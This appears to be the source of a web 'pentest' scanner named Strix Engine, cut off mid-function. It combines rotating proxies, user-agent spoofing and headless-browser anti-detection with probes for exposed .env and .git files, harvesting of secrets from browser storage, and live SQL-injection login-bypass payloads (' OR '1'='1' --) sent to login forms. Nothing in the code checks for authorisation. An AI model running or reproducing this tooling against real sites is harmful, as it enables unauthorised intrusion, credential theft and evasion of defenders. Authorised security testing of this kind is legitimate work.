import { getGroqClient } from '@/lib/diagramGenerator';
import dns from 'dns';
import chromium from '@sparticuz/chromium-min';
import puppeteerCore from 'puppeteer-core';
import { HttpsProxyAgent } from 'https-proxy-agent';
import nodeFetch from 'node-fetch';
import { 
  parseGitHubUrl, 
  fetchRepoMetadata, 
  fetchRepoTree, 
  fetchRepoReadme, 
  fetchKeyFilesContent, 
  formatTreeStructure 
} from '@/lib/github';

// --- IP Rotating Proxy & Stealth Configuration ---
const PROXY_LIST_ENV = process.env.PROXY_LIST || process.env.PROXY_URL || '';
const PROXIES = PROXY_LIST_ENV.split(',').map(p => p.trim()).filter(p => p.length > 0);

export function getRandomProxy() {
  if (PROXIES.length === 0) return null;
  return PROXIES[Math.floor(Math.random() * PROXIES.length)];
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
];

export function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

/**
 * Performs resilient HTTP fetch with rotating proxy support and automatic direct fallback.
 */
export async function resilientFetch(url, options = {}) {
  const activeProxy = getRandomProxy();
  const userAgent = getRandomUserAgent();
  const mergedHeaders = {
    'User-Agent': userAgent,
    ...(options.headers || {}),
  };

  if (!activeProxy) {
    return await fetch(url, { ...options, headers: mergedHeaders });
  }

  try {
    const proxyAgent = new HttpsProxyAgent(activeProxy);
    const controller = new AbortController();
    const timeoutMs = options.timeoutMs || 8000;
    const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

    const res = await nodeFetch(url, {
      ...options,
      headers: mergedHeaders,
      agent: proxyAgent,
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    return res;
  } catch (err) {
    console.warn(`[Strix Engine] Proxy fetch failed via ${activeProxy} for ${url} (${err.message}). Falling back to direct connection.`);
    return await fetch(url, { ...options, headers: mergedHeaders });
  }
}

/**
 * Launches Puppeteer browser in Production or Local Dev with proxy rotation and stealth.
 */
async function launchPuppeteerBrowser(activeProxy = null) {
  const isProd = process.env.NODE_ENV === 'production';
  let launchArgs = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--no-first-run',
    '--no-zygote',
    '--disable-gpu',
  ];
  if (isProd) {
    launchArgs.push(...chromium.args);
  }

  let proxyAuth = null;
  if (activeProxy) {
    try {
      const proxyUrlObj = new URL(activeProxy);
      launchArgs.push(`--proxy-server=${proxyUrlObj.host}`);
      if (proxyUrlObj.username || proxyUrlObj.password) {
        proxyAuth = {
          username: decodeURIComponent(proxyUrlObj.username),
          password: decodeURIComponent(proxyUrlObj.password),
        };
      }
    } catch {
      // Invalid proxy URL, ignore
    }
  }

  let browser;
  if (isProd) {
    const executablePath = await chromium.executablePath(
      'https://github.com/Sparticuz/chromium/releases/download/v121.0.0/chromium-v121.0.0-pack.tar'
    );
    browser = await puppeteerCore.launch({
      args: launchArgs,
      defaultViewport: chromium.defaultViewport || { width: 1280, height: 800 },
      executablePath,
      headless: chromium.headless,
    });
  } else {
    const basePuppeteer = (await import('puppeteer')).default;
    browser = await basePuppeteer.launch({
      headless: 'new',
      args: launchArgs,
    });
  }

  return { browser, proxyAuth };
}

/**
 * Executes a Deep Headless Browser Audit via Puppeteer with rotating proxy,
 * WebRTC STUN IP leak detection, client storage scanning, DOM media discovery, and screenshot capture.
 */
export async function auditWithPuppeteer(targetUrl) {
  const auditResult = {
    executed: false,
    proxyUsed: 'Direct',
    fallbackTriggered: false,
    webrtcLeakedIps: [],
    domMediaDiscovered: [],
    clientStorageSecrets: [],
    screenshotProof: '',
    note: '',
  };

  const activeProxy = getRandomProxy();
  auditResult.proxyUsed = activeProxy ? activeProxy.replace(/\/\/[^:]+:[^@]+@/, '//***:***@') : 'Direct (No Proxy Configured)';

  let browser = null;

  try {
    let launchResult;
    try {
      launchResult = await launchPuppeteerBrowser(activeProxy);
      browser = launchResult.browser;
    } catch (launchErr) {
      if (activeProxy) {
        console.warn(`[Puppeteer] Failed launching browser with proxy ${activeProxy} (${launchErr.message}). Retrying directly.`);
        auditResult.fallbackTriggered = true;
        auditResult.proxyUsed = 'Direct (Proxy Launch Fallback)';
        launchResult = await launchPuppeteerBrowser(null);
        browser = launchResult.browser;
      } else {
        throw launchErr;
      }
    }

    let page = await browser.newPage();
    if (launchResult.proxyAuth) {
      await page.authenticate(launchResult.proxyAuth);
    }

    const ua = getRandomUserAgent();
    await page.setUserAgent(ua);
    await page.setViewport({ width: 1280, height: 720 });

    // Anti-detection stealth
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    });

    // Intercept network requests for media & key leaks
    const interceptedMedia = new Set();
    page.on('response', (response) => {
      try {
        const rUrl = response.url();
        const cType = (response.headers()['content-type'] || '').toLowerCase();
        if (
          rUrl.includes('/storage') || 
          rUrl.includes('/media') || 
          rUrl.includes('/uploads') || 
          rUrl.includes('/files') ||
          cType.startsWith('image/') || 
          cType.startsWith('video/') ||
          cType.includes('pdf')
        ) {
          interceptedMedia.add(rUrl);
        }
      } catch {}
    });

    // Navigate with proxy fallback
    try {
      await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
    } catch (navErr) {
      if ((navErr.message.includes('ERR_PROXY_CONNECTION_FAILED') || navErr.message.includes('ERR_TIMED_OUT')) && activeProxy) {
        console.warn(`[Puppeteer] Navigation with proxy failed: ${navErr.message}. Retrying without proxy...`);
        auditResult.fallbackTriggered = true;
        auditResult.proxyUsed = 'Direct (Proxy Navigation Fallback)';
        await browser.close();
        browser = null;

        // Relaunch direct without proxy
        const directLaunch = await launchPuppeteerBrowser(null);
        browser = directLaunch.browser;
        page = await browser.newPage();
        await page.setUserAgent(ua);
        await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
      } else {
        // Fallback to domcontentloaded or proceed with current DOM
        try {
          await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
        } catch {
          // Continue to evaluate whatever DOM is loaded
        }
      }
    }

    auditResult.executed = true;

    // 1. WebRTC STUN IP Leak Probe in Live Browser
    try {
      const leakedIps = await page.evaluate(async () => {
        return new Promise((resolve) => {
          const ips = new Set();
          try {
            const rtc = new window.RTCPeerConnection({
              iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            rtc.createDataChannel('strix-webrtc-audit');
            rtc.onicecandidate = (event) => {
              if (event && event.candidate && event.candidate.candidate) {
                const cand = event.candidate.candidate;
                const match = cand.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                if (match) ips.add(match[0]);
              } else if (!event || !event.candidate) {
                resolve(Array.from(ips));
              }
            };
            rtc.createOffer()
              .then(offer => rtc.setLocalDescription(offer))
              .catch(() => resolve([]));
            setTimeout(() => resolve(Array.from(ips)), 2000);
          } catch {
            resolve([]);
          }
        });
      });

      if (Array.isArray(leakedIps)) {
        auditResult.webrtcLeakedIps = leakedIps;
      }
    } catch {
      // WebRTC probe exception fallback
    }

    // 2. Client-side Media, LocalStorage & SessionStorage Encryption Secret Audit
    try {
      const clientStorageAndMedia = await page.evaluate(() => {
        const foundSecrets = [];
        const mediaUrls = [];

        // Scan localStorage
        try {
          for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            const v = localStorage.getItem(k);
            if (/(crypto|token|cipher|secret|encrypt|media|storage|aes|key|auth|session)/i.test(k) || /(aes|bearer|eyj)/i.test(v)) {
              foundSecrets.push(`localStorage['${k}'] = ${String(v).slice(0, 80)}`);
            }
          }
        } catch {}

        // Scan sessionStorage
        try {
          for (let i = 0; i < sessionStorage.length; i++) {
            const k = sessionStorage.key(i);
            const v = sessionStorage.getItem(k);
            if (/(crypto|token|cipher|secret|encrypt|media|storage|aes|key|auth|session)/i.test(k) || /(aes|bearer|eyj)/i.test(v)) {
              foundSecrets.push(`sessionStorage['${k}'] = ${String(v).slice(0, 80)}`);
            }
          }
        } catch {}

        // Scan DOM for media sources
        try {
          const mediaElements = document.querySelectorAll('img, video, audio, source, a[href*="storage"], a[href*="media"], a[href*="upload"]');
          mediaElements.forEach(el => {
            const src = el.src || el.href || el.getAttribute('src') || el.getAttribute('href');
            if (src && (src.includes('/storage') || src.includes('/media') || src.includes('/uploads') || src.startsWith('blob:'))) {
              mediaUrls.push(src);
            }
          });
        } catch {}

        return { foundSecrets, mediaUrls };
      });

      auditResult.clientStorageSecrets = clientStorageAndMedia.foundSecrets || [];
      const combinedMedia = new Set([
        ...clientStorageAndMedia.mediaUrls,
        ...Array.from(interceptedMedia),
      ]);
      auditResult.domMediaDiscovered = Array.from(combinedMedia).slice(0, 15);
    } catch {
      // DOM audit fallback
    }

    // 3. Visual Proof Screenshot
    try {
      const screenshotBuffer = await page.screenshot({
        type: 'jpeg',
        quality: 60,
      });
      auditResult.screenshotProof = `data:image/jpeg;base64,${screenshotBuffer.toString('base64')}`;
    } catch {
      // Screenshot error fallback
    }

    auditResult.note = `Puppeteer headless browser executed successfully (${auditResult.proxyUsed}). Evaluated WebRTC STUN network, client-side storage, and rendered DOM media.`;

  } catch (browserError) {
    console.warn(`[Strix Engine] Puppeteer execution encountered an error: ${browserError.message}. Seamlessly falling back to native HTTP/DNS probe.`);
    auditResult.executed = false;
    auditResult.fallbackTriggered = true;
    auditResult.note = `Puppeteer launch/render bypassed due to environment constraint (${browserError.message}). Native HTTP/DNS audit completed as fallback.`;
  } finally {
    if (browser) {
      try {
        await browser.close();
      } catch {}
    }
  }

  return auditResult;
}

const DEFAULT_MODEL = 'openai/gpt-oss-120b';

const COMMON_SENSITIVE_PATHS = [
  // Environment and configuration files
  { path: '/.env', desc: 'Environment variables file' },
  { path: '/.env.local', desc: 'Local environment configuration' },
  { path: '/.env.production', desc: 'Production environment configuration' },
  { path: '/.env.example', desc: 'Environment configuration template' },
  { path: '/.env.backup', desc: 'Environment backup file' },
  // Git & metadata
  { path: '/.git/HEAD', desc: 'Git repository metadata' },
  { path: '/robots.txt', desc: 'Robots crawler directives' },
  { path: '/.well-known/security.txt', desc: 'Security contact declaration' },
  { path: '/security.txt', desc: 'Security disclosure file' },
  // API specs & docs
  { path: '/swagger.json', desc: 'OpenAPI / Swagger API specification' },
  { path: '/api-docs', desc: 'Interactive API documentation' },
  { path: '/api', desc: 'Base API endpoint' },
  { path: '/graphql', desc: 'GraphQL endpoint' },
  // Admin & management interfaces
  { path: '/admin', desc: 'Administrative control portal' },
  { path: '/admin/login', desc: 'Admin login page' },
  { path: '/administrator', desc: 'Joomla/CMS administrator portal' },
  { path: '/manage', desc: 'Management console' },
  { path: '/cpanel', desc: 'Control panel interface' },
  { path: '/dashboard', desc: 'User / Admin dashboard' },
  { path: '/wp-admin', desc: 'WordPress administrative dashboard' },
  // Login & authentication endpoints
  { path: '/login', desc: 'User login portal' },
  { path: '/signin', desc: 'Sign in endpoint' },
  { path: '/auth/login', desc: 'Authentication login endpoint' },
  { path: '/api/login', desc: 'API login handler' },
  { path: '/api/auth/signin', desc: 'NextAuth / Auth.js signin handler' },
  { path: '/wp-login.php', desc: 'WordPress login handler' },
];

/**
 * Parses raw .env content to extract endpoints, URLs, and sensitive configurations.
 */
export function parseEnvContent(envText, sourceLabel = '.env') {
  if (!envText || typeof envText !== 'string') return [];
  const lines = envText.split(/\r?\n/);
  const extracted = [];
  const seenKeys = new Set();

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const eqIdx = trimmed.indexOf('=');
    if (eqIdx === -1) continue;

    const key = trimmed.slice(0, eqIdx).trim();
    let val = trimmed.slice(eqIdx + 1).trim();
    // Strip wrapping quotes
    val = val.replace(/^["'](.*)["']$/, '$1').trim();

    if (!key || seenKeys.has(key)) continue;

    const isUrl = /^https?:\/\//i.test(val) || 
                  /^(mongodb(\+srv)?|postgres(ql)?|redis|mysql|sqlite|amqp):\/\//i.test(val);
    const isEndpointKey = /(URL|URI|ENDPOINT|HOST|DOMAIN|API|PATH|SERVICE|PORTAL|GATEWAY|BACKEND|SERVER)/i.test(key);
    const isPathVal = /^\/[a-zA-Z0-9_\-\/]+$/.test(val);

    if (isUrl || isEndpointKey || isPathVal) {
      seenKeys.add(key);
      const isSecret = /(KEY|SECRET|PASSWORD|PASS|PASSWD|TOKEN|CREDENTIAL|PRIVATE|CERT)/i.test(key);
      let detectedType = 'ENDPOINT';
      if (isUrl) {
        if (/mongodb/i.test(val)) detectedType = 'MONGODB_URI';
        else if (/postgres/i.test(val)) detectedType = 'POSTGRES_URL';
        else if (/redis/i.test(val)) detectedType = 'REDIS_URL';
        else if (/mysql/i.test(val)) detectedType = 'MYSQL_URL';
        else detectedType = 'HTTP_URL';
      } else if (isPathVal) {
        detectedType = 'API_PATH';
      }

      extracted.push({
        key,
        value: val,
        type: detectedType,
        isSecret,
        source: sourceLabel,
      });
    }
  }

  return extracted;
}

/**
 * Extracts links, form actions, and script route references from an HTML page.
 */
export function extractEndpointsFromHtml(html, baseUrlStr) {
  if (!html || typeof html !== 'string') {
    return { adminEndpoints: [], loginEndpoints: [], allEndpoints: [] };
  }

  let baseUrl;
  try {
    baseUrl = new URL(baseUrlStr);
  } catch {
    baseUrl = { origin: '' };
  }

  const adminSet = new Set();
  const loginSet = new Set();
  const allSet = new Set();

  // 1. Extract href links
  const hrefMatches = html.matchAll(/href=["'](\/[^"'#\s]*|https?:\/\/[^"'#\s]*)["']/gi);
  for (const match of hrefMatches) {
    const rawPath = match[1];
    let path = rawPath;
    if (rawPath.startsWith('http')) {
      try {
        const u = new URL(rawPath);
        if (baseUrl.origin && u.origin !== baseUrl.origin) continue;
        path = u.pathname + u.search;
      } catch {
        continue;
      }
    }
    if (!path.startsWith('/')) continue;
    allSet.add(path);

    if (/(admin|administrator|cpanel|dashboard|portal|manage|backend)/i.test(path)) {
      adminSet.add(path);
    }
    if (/(login|signin|sign-in|auth|session|signup|register)/i.test(path)) {
      loginSet.add(path);
    }
  }

  // 2. Extract form actions and detect login forms
  const formMatches = html.matchAll(/<form[^>]*action=["']([^"']*)["'][^>]*>(.*?)<\/form>/gis);
  for (const match of formMatches) {
    const action = match[1] || '';
    const formInner = match[2] || '';
    let actionPath = action;
    if (action.startsWith('http')) {
      try {
        actionPath = new URL(action).pathname;
      } catch {
        actionPath = action;
      }
    }
    if (actionPath.startsWith('/')) {
      allSet.add(actionPath);
    }

    const hasPasswordField = /type=["']password["']|name=["'](password|pass|passwd|token)["']/i.test(formInner);
    const isAuthAction = /(login|signin|auth|session)/i.test(actionPath);

    if (hasPasswordField || isAuthAction) {
      loginSet.add(actionPath || '/login');
    }
    if (/(admin|manage)/i.test(actionPath)) {
      adminSet.add(actionPath);
    }
  }

  // 3. Extract API and route literals in JavaScript strings
  const jsStringMatches = html.matchAll(/["'](\/(?:api|admin|auth|login|dashboard)\/[a-zA-Z0-9_\-\/]+)["']/g);
  for (const match of jsStringMatches) {
    const endpoint = match[1];
    allSet.add(endpoint);
    if (/(admin|manage)/i.test(endpoint)) adminSet.add(endpoint);
    if (/(login|signin|auth)/i.test(endpoint)) loginSet.add(endpoint);
  }

  return {
    adminEndpoints: Array.from(adminSet),
    loginEndpoints: Array.from(loginSet),
    allEndpoints: Array.from(allSet).slice(0, 40),
  };
}

/**
 * Intercepts login form parameters, fuzzes SQLi/auth payloads, and analyzes server responses.
 * Implements the Burp Suite Request Interception & Intruder testing methodology.
 */
export async function fuzzLoginSecurity(baseUrl, loginPath, formHtml = '') {
  const diagnosis = {
    fields: ['email', 'password'],
    hasCsrf: false,
    rateLimitDetected: false,
    fuzzResult: 'SECURE', // 'BYPASS_DETECTED' | 'SQL_ERROR_LEAK' | 'SECURE'
    bypassEvidence: null,
    sqlErrorEvidence: null,
    interceptedRequest: null,
    sampleResponseSnippet: null,
  };

  const targetEndpoint = `${baseUrl}${loginPath}`;

  // 1. Parameter Interception: Extract input field names & anti-CSRF token
  let userField = 'email';
  let passField = 'password';

  if (formHtml) {
    const inputMatches = formHtml.matchAll(/<input[^>]*name=["']([^"']*)["'][^>]*>/gi);
    const detectedNames = [];
    for (const m of inputMatches) {
      const name = m[1].toLowerCase();
      detectedNames.push(name);
      if (/(email|username|user|login|account|id)/i.test(name)) userField = m[1];
      if (/(password|pass|pwd|passwd)/i.test(name)) passField = m[1];
      if (/(csrf|token|_token|authenticity)/i.test(name)) diagnosis.hasCsrf = true;
    }
    if (detectedNames.length > 0) {
      diagnosis.fields = detectedNames.slice(0, 5);
    }
  }

  let hostStr = 'target';
  try {
    hostStr = new URL(baseUrl).host;
  } catch {}
  diagnosis.interceptedRequest = `POST ${loginPath} HTTP/1.1\nHost: ${hostStr}\nContent-Type: application/json\nUser-Agent: Strix-Pentest/2.0 (Auth Intercept & Probe)\n\n{\n  "${userField}": "<intercepted_payload>",\n  "${passField}": "<intercepted_payload>"\n}`;

  // 2. Baseline Probe (captures normal failure behavior)
  let baselineStatus = 401;
  try {
    const baseController = new AbortController();
    const bTimeout = setTimeout(() => baseController.abort(), 4000);
    const baseRes = await resilientFetch(targetEndpoint, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'User-Agent': 'Strix-Pentest/2.0 (Auth Intercept & Probe)',
      },
      body: JSON.stringify({
        [userField]: 'audit_test_dummy_user@probe.internal',
        [passField]: 'dummy_invalid_password_123',
      }),
      signal: baseController.signal,
      redirect: 'manual',
    });
    clearTimeout(bTimeout);
    baselineStatus = baseRes.status;
  } catch {
    // Continue
  }

  // 3. Automated Payload Fuzzing (Burp Intruder style): SQL Injection Tautology & Bypass Test
  try {
    const sqliController = new AbortController();
    const sTimeout = setTimeout(() => sqliController.abort(), 4000);
    const sqliRes = await resilientFetch(targetEndpoint, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'User-Agent': 'Strix-Pentest/2.0 (Auth Intercept & Probe)',
      },
      body: JSON.stringify({
        [userField]: "' OR '1'='1' --",
        [passField]: 'any_password',
      }),
      signal: sqliController.signal,
      redirect: 'manual',
    });
    clearTimeout(sTimeout);

    const sqliText = await sqliRes.text();
    const sqliStatus = sqliRes.status;
    const cookieHeader = sqliRes.headers.get('set-cookie') || '';

    // Bypass Analysis: Status 200 with tokens/cookies or redirecting to dashboard
    const isSuccessBypass = (sqliStatus >= 200 && sqliStatus < 300) && (
      (baselineStatus >= 400) ||
      cookieHeader.toLowerCase().includes('session') ||
      cookieHeader.toLowerCase().includes('token') ||
      /("token"|"jwt"|"accessToken"|"success":true)/i.test(sqliText)
    );

    const isRedirectBypass = (sqliStatus === 302 || sqliStatus === 301) && (
      (sqliRes.headers.get('location') || '').includes('/dashboard') ||
      (sqliRes.headers.get('location') || '').includes('/admin')
    );

    if (isSuccessBypass || isRedirectBypass) {
      diagnosis.fuzzResult = 'BYPASS_DETECTED';
      diagnosis.bypassEvidence = `Tautological SQL payload (' OR '1'='1' --) yielded HTTP ${sqliStatus} with authentication credentials or session tokens, whereas normal probe returned HTTP ${baselineStatus}.`;
      diagnosis.sampleResponseSnippet = `HTTP/1.1 ${sqliStatus}\nSet-Cookie: ${cookieHeader || 'none'}\nContent-Type: ${sqliRes.headers.get('content-type') || 'application/json'}\n\n${sqliText.slice(0, 320)}`;
    }
  } catch {
    // Continue
  }

  // 4. SQL Error Leakage Probe
  if (diagnosis.fuzzResult !== 'BYPASS_DETECTED') {
    try {
      const errController = new AbortController();
      const eTimeout = setTimeout(() => errController.abort(), 4000);
      const errRes = await resilientFetch(targetEndpoint, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'User-Agent': 'Strix-Pentest/2.0 (Auth Intercept & Probe)',
        },
        body: JSON.stringify({
          [userField]: "admin'\"",
          [passField]: "pass'",
        }),
        signal: errController.signal,
        redirect: 'manual',
      });
      clearTimeout(eTimeout);
      const errText = await errRes.text();

      const sqlErrorPatterns = [
        /syntax error in SQL/i,
        /unclosed quotation mark/i,
        /SQLSTATE\[/i,
        /mysql_fetch/i,
        /pg_query/i,
        /sqlite3\.OperationalError/i,
        /check the manual that corresponds to your MySQL server/i,
        /ORA-01756/i,
      ];

      for (const pattern of sqlErrorPatterns) {
        if (pattern.test(errText)) {
          diagnosis.fuzzResult = 'SQL_ERROR_LEAK';
          diagnosis.sqlErrorEvidence = `Database error signature detected in response: ${errText.slice(0, 160)}...`;
          diagnosis.sampleResponseSnippet = `HTTP/1.1 ${errRes.status}\nContent-Type: ${errRes.headers.get('content-type') || 'text/html'}\n\n${errText.slice(0, 320)}`;
          break;
        }
      }
    } catch {
      // Continue
    }
  }

  // 5. Rate Limiting Check (Simulating Burp Intruder rapid requests)
  try {
    let hitRateLimit = false;
    for (let i = 0; i < 3; i++) {
      const rlRes = await resilientFetch(targetEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ [userField]: `fuzz_test_${i}@probe.internal`, [passField]: '123456' }),
      });
      if (rlRes.status === 429 || rlRes.status === 403) {
        hitRateLimit = true;
        break;
      }
    }
    diagnosis.rateLimitDetected = hitRateLimit;
  } catch {
    // Continue
  }

  return diagnosis;
}

/**
 * Perform active reconnaissance on a live HTTP/HTTPS web target.
 */
export async function probeWebTarget(targetUrl, { onProgress } = {}) {
  let normalizedUrl = targetUrl.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = `https://${normalizedUrl}`;
  }

  const reconData = {
    url: normalizedUrl,
    statusCode: null,
    server: 'Unknown',
    ipAddress: '',
    technologies: [],
    headers: {},
    missingSecurityHeaders: [],
    probedEndpoints: [],
    exposedRisks: [],
    envEndpoints: [],
    adminEndpoints: [],
    loginEndpoints: [],
    mediaEncryption: {
      testedPaths: [],
      leakedMedia: [],
      status: 'SECURE',
      evidence: '',
    },
    ipExposure: {
      detectedServerIp: '',
      originIpLeaked: false,
      leakVectors: [],
      clientIpReflected: false,
      clientIp: '',
      isBehindProxy: false,
      proxyProvider: 'Direct Origin Server',
      evidence: '',
    },
    puppeteerAudit: {
      executed: false,
      proxyUsed: '',
      fallbackTriggered: false,
      webrtcLeakedIps: [],
      domMediaDiscovered: [],
      clientStorageSecrets: [],
      screenshotProof: '',
      note: '',
    },
  };

  let hostName = '';
  try {
    hostName = new URL(normalizedUrl).hostname;
  } catch {}

  const ipExposure = {
    detectedServerIp: '',
    originIpLeaked: false,
    leakVectors: [],
    clientIpReflected: false,
    clientIp: '',
    isBehindProxy: false,
    proxyProvider: 'Direct Origin Server',
    evidence: '',
  };

  if (hostName) {
    try {
      const lookupResult = await dns.promises.lookup(hostName);
      if (lookupResult?.address) {
        reconData.ipAddress = lookupResult.address;
        ipExposure.detectedServerIp = lookupResult.address;
      }
    } catch {
      // DNS lookup fallback
    }
  }

  let htmlBody = '';
  let controller = new AbortController();
  let timeoutId = setTimeout(() => controller.abort(), 9000);

  try {
    const res = await resilientFetch(normalizedUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Strix-Pentest/2.0 (Security Audit)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      signal: controller.signal,
      redirect: 'follow',
    });
    clearTimeout(timeoutId);

    reconData.statusCode = res.status;
    const headerObj = {};
    res.headers.forEach((value, key) => {
      headerObj[key.toLowerCase()] = value;
    });
    reconData.headers = headerObj;

    // Read initial HTML to extract dynamic endpoints (login & admin links)
    try {
      htmlBody = await res.text();
    } catch {
      htmlBody = '';
    }

    // Detect server banner
    if (headerObj['server']) {
      reconData.server = headerObj['server'];
      reconData.technologies.push(`Server: ${headerObj['server']}`);
    }
    if (headerObj['x-powered-by']) {
      reconData.technologies.push(`Powered-By: ${headerObj['x-powered-by']}`);
      reconData.exposedRisks.push(`Server leaks technology stack via 'X-Powered-By: ${headerObj['x-powered-by']}' (CWE-200)`);
    }

    // Technology heuristics from response headers and body
    if (headerObj['x-nextjs-matched-path'] || headerObj['x-nextjs-page'] || htmlBody.includes('__NEXT_DATA__')) {
      reconData.technologies.push('Framework: Next.js');
    }
    if (htmlBody.includes('/wp-content/') || htmlBody.includes('wp-json')) {
      reconData.technologies.push('CMS: WordPress');
    }
    if (headerObj['cf-ray']) reconData.technologies.push('CDN/WAF: Cloudflare');
    if (headerObj['x-vercel-id']) reconData.technologies.push('Host: Vercel');
    if (headerObj['x-amz-cf-id']) reconData.technologies.push('CDN: AWS CloudFront');

    // 1. Analyze Proxy & Origin IP Exposure
    if (headerObj['cf-ray'] || headerObj['server']?.toLowerCase().includes('cloudflare')) {
      ipExposure.isBehindProxy = true;
      ipExposure.proxyProvider = 'Cloudflare Reverse Proxy & WAF';
    } else if (headerObj['x-amz-cf-id']) {
      ipExposure.isBehindProxy = true;
      ipExposure.proxyProvider = 'AWS CloudFront CDN';
    } else if (headerObj['x-vercel-id']) {
      ipExposure.isBehindProxy = true;
      ipExposure.proxyProvider = 'Vercel Edge Network';
    } else if (headerObj['x-fastly-request-id']) {
      ipExposure.isBehindProxy = true;
      ipExposure.proxyProvider = 'Fastly CDN';
    } else if (headerObj['x-akamai-transformed']) {
      ipExposure.isBehindProxy = true;
      ipExposure.proxyProvider = 'Akamai CDN';
    } else {
      ipExposure.isBehindProxy = false;
      ipExposure.proxyProvider = 'Direct Origin (Unshielded)';
    }

    // Inspect headers for Origin Server IP leaks & Internal Subnet disclosures
    const ipHeadersToCheck = [
      'x-real-ip', 'x-origin-ip', 'x-backend-server', 'x-server-ip', 
      'x-forwarded-for', 'x-forwarded-server', 'x-host', 'server-ip', 
      'x-backend-host', 'x-proxy-id'
    ];
    for (const hKey of ipHeadersToCheck) {
      const val = headerObj[hKey];
      if (val) {
        ipExposure.leakVectors.push(`${hKey}: ${val}`);
        ipExposure.originIpLeaked = true;
      }
    }

    // Check for RFC 1918 internal IP leak regex in all headers or HTML
    const privateIpRegex = /\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/;
    for (const [k, v] of Object.entries(headerObj)) {
      const match = typeof v === 'string' && v.match(privateIpRegex);
      if (match && !ipExposure.leakVectors.some(l => l.includes(match[0]))) {
        ipExposure.leakVectors.push(`Header '${k}' leaks internal subnet IP: ${match[0]}`);
        ipExposure.originIpLeaked = true;
      }
    }

    // If server is not behind any proxy, its origin IP is directly exposed to direct connection & DDoS
    if (!ipExposure.isBehindProxy && reconData.ipAddress) {
      ipExposure.originIpLeaked = true;
      ipExposure.leakVectors.push(`Direct Origin Exposure: Domain resolves directly to public host IP ${reconData.ipAddress} without CDN/WAF proxy shield.`);
      ipExposure.evidence = `Server public IP ${reconData.ipAddress} is directly exposed on DNS A record and responds to direct TCP/HTTP traffic without proxy obscuration.`;
    } else if (ipExposure.leakVectors.length > 0) {
      ipExposure.evidence = `Origin/internal IP exposure detected across headers: ${ipExposure.leakVectors.join('; ')}`;
    } else {
      ipExposure.evidence = `Server is shielded behind ${ipExposure.proxyProvider}. No direct origin IP leakage detected in HTTP headers.`;
    }

    reconData.ipExposure = ipExposure;
    if (ipExposure.originIpLeaked) {
      reconData.exposedRisks.push(`Origin IP Exposure: ${ipExposure.leakVectors[0]}`);
    }

    // Missing Security Headers Assessment
    if (!headerObj['strict-transport-security'] && normalizedUrl.startsWith('https://')) {
      reconData.missingSecurityHeaders.push('Strict-Transport-Security (HSTS)');
    }
    if (!headerObj['content-security-policy']) {
      reconData.missingSecurityHeaders.push('Content-Security-Policy (CSP)');
    }
    if (!headerObj['x-frame-options'] && !headerObj['content-security-policy']?.includes('frame-ancestors')) {
      reconData.missingSecurityHeaders.push('X-Frame-Options (Clickjacking Protection)');
    }
    if (!headerObj['x-content-type-options']) {
      reconData.missingSecurityHeaders.push('X-Content-Type-Options: nosniff');
    }
    if (!headerObj['referrer-policy']) {
      reconData.missingSecurityHeaders.push('Referrer-Policy');
    }
    if (!headerObj['permissions-policy']) {
      reconData.missingSecurityHeaders.push('Permissions-Policy');
    }

    // CORS check
    const corsHeader = headerObj['access-control-allow-origin'];
    if (corsHeader === '*') {
      reconData.exposedRisks.push('Overly permissive wildcard CORS: Access-Control-Allow-Origin is set to "*"');
    }

    // Cookie security flags check
    const setCookie = headerObj['set-cookie'];
    if (setCookie) {
      if (!/secure/i.test(setCookie) && normalizedUrl.startsWith('https://')) {
        reconData.exposedRisks.push('Cookie missing "Secure" flag (transmitted over cleartext if downgraded)');
      }
      if (!/httponly/i.test(setCookie)) {
        reconData.exposedRisks.push('Cookie missing "HttpOnly" flag (accessible to malicious JavaScript via XSS)');
      }
      if (!/samesite/i.test(setCookie)) {
        reconData.exposedRisks.push('Cookie missing "SameSite" attribute (susceptible to CSRF)');
      }
    }

  } catch (err) {
    clearTimeout(timeoutId);
    reconData.exposedRisks.push(`Initial connectivity probe error: ${err.message}`);
  }

  // Extract endpoints from the fetched HTML
  const htmlExtracted = extractEndpointsFromHtml(htmlBody, normalizedUrl);

  // Build the complete list of target endpoints to probe
